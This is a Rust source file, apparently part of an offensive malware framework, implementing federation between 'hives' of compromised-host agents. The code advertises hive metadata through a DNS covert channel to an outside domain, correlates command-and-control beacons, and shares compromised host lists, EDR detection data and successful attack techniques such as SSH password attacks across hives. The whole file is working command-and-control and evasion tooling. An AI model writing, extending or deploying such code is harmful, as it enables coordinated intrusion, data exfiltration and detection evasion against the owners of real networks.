// Hive Federation: communication between independent hives.
// Two hives on different networks discover each other via:
//   1. Shared C2 server (beacon correlation)
//   2. DNS covert channel (encoded hive metadata in TXT records)
//   3. Stigmergy bridges (shared cloud storage, paste sites)
//
// Once connected, hives share:
//   - EDR hashes and bypass techniques
//   - Successful attack variants (Death Dance winners)
//   - Compromised host lists
//   - Royal Jelly directives

use crate::ldc::{Message, Role, Value};
use uuid::Uuid;
use tracing::{info, warn};
use std::collections::HashMap;

/// A remote hive that this hive has discovered.
#[derive(Debug, Clone)]
pub struct RemoteHive {
    pub hive_id: Uuid,
    pub discovery_method: String,      // "c2_correlation", "dns", "stigmergy", "direct"
    pub last_contact: u64,
    pub shared_hosts: Vec<String>,
    pub shared_techniques: Vec<String>,
    pub threat_level: f32,             // EDR presence in that hive's network
}

/// Federation manager: tracks remote hives and syncs intel.
pub struct HiveFederation {
    pub remote_hives: HashMap<Uuid, RemoteHive>,
    pub federation_id: Uuid,           // shared federation token
}

impl HiveFederation {
    pub fn new() -> Self {
        Self {
            remote_hives: HashMap::new(),
            federation_id: Uuid::new_v4(),
        }
    }

    /// Advertise this hive to others via DNS TXT records.
    /// Encodes hive_id + federation_id + threat_level as a DNS query.
    pub fn advertise_dns(&self, domain: &str) {
        let payload = format!(
            "hive_id={}|fed_id={}|threat={:.2}|hosts={}",
            Uuid::new_v4().to_string().chars().take(8).collect::<String>(),
            self.federation_id.to_string().chars().take(8).collect::<String>(),
            0.0,
            1,
        );
        let encoded = hex::encode(payload.as_bytes());
        let query = format!("{}.{}", &encoded[..50.min(encoded.len())], domain);

        // Send via DNS lookup
        use std::net::ToSocketAddrs;
        if let Ok(_) = format!("{}:0", query).to_socket_addrs() {
            info!("FEDERATION: advertised via DNS: {}", &query[..40.min(query.len())]);
        }
    }

    /// Discover other hives via C2 beacon correlation.
    /// The C2 server can correlate beacons from different hosts.
    pub fn discover_via_c2(&mut self, c2_beacons: &[serde_json::Value]) {
        for beacon in c2_beacons {
            if let Some(hive_tag) = beacon.get("hive_federation").and_then(|v| v.as_str()) {
                let hive_id = Uuid::parse_str(hive_tag).unwrap_or_else(|_| Uuid::new_v4());
                if !self.remote_hives.contains_key(&hive_id) {
                    info!("FEDERATION: discovered remote hive {}", hive_id);
                    self.remote_hives.insert(hive_id, RemoteHive {
                        hive_id,
                        discovery_method: "c2_correlation".into(),
                        last_contact: crate::utils::timestamp_now(),
                        shared_hosts: Vec::new(),
                        shared_techniques: Vec::new(),
                        threat_level: 0.0,
                    });
                }
            }
        }
    }

    /// Share successful attack techniques with remote hives.
    pub fn share_technique(&mut self, technique: &str, success_rate: f32) {
        for hive in self.remote_hives.values_mut() {
            if !hive.shared_techniques.contains(&technique.to_string()) {
                hive.shared_techniques.push(technique.to_string());
                info!("FEDERATION: shared technique '{}' ({:.0}%) with hive {}",
                    technique, success_rate * 100.0, hive.hive_id);
            }
        }
    }

    /// Share compromised hosts list with remote hives.
    pub fn share_hosts(&mut self, hosts: &[String]) {
        for hive in self.remote_hives.values_mut() {
            for host in hosts {
                if !hive.shared_hosts.contains(host) {
                    hive.shared_hosts.push(host.clone());
                }
            }
        }
    }

    /// Sync EDR threat intelligence across the federation.
    pub fn sync_threat_intel(&mut self, edr_detected: bool, edr_name: &str) {
        let threat = if edr_detected { 0.8 } else { 0.1 };
        for hive in self.remote_hives.values_mut() {
            hive.threat_level = hive.threat_level.max(threat);
        }
        if edr_detected {
            warn!("FEDERATION: EDR '{}' detected, alerting {} remote hives",
                edr_name, self.remote_hives.len());
        }
    }

    /// Emit a federation beacon to the swarm so all agents know about remote hives.
    pub fn emit_federation_belief(&self, agent_id: Uuid) -> Vec<Message> {
        self.remote_hives.values().map(|hive| {
            Message::belief(
                agent_id, Role::Queen,
                format!("federation:hive:{}", hive.hive_id),
                Value::String(format!(
                    "method:{}|hosts:{}|techs:{}|threat:{:.2}",
                    hive.discovery_method,
                    hive.shared_hosts.len(),
                    hive.shared_techniques.len(),
                    hive.threat_level,
                )),
                1.0,
            )
        }).collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_federation_new() {
        let fed = HiveFederation::new();
        assert!(fed.remote_hives.is_empty());
    }

    #[test]
    fn test_share_technique() {
        let mut fed = HiveFederation::new();
        // Manually add a remote hive
        fed.remote_hives.insert(Uuid::new_v4(), RemoteHive {
            hive_id: Uuid::new_v4(), discovery_method: "test".into(),
            last_contact: 0, shared_hosts: vec![], shared_techniques: vec![],
            threat_level: 0.0,
        });
        fed.share_technique("ssh_pass_auth", 0.85);
        assert_eq!(fed.remote_hives.values().next().unwrap().shared_techniques.len(), 1);
    }
}
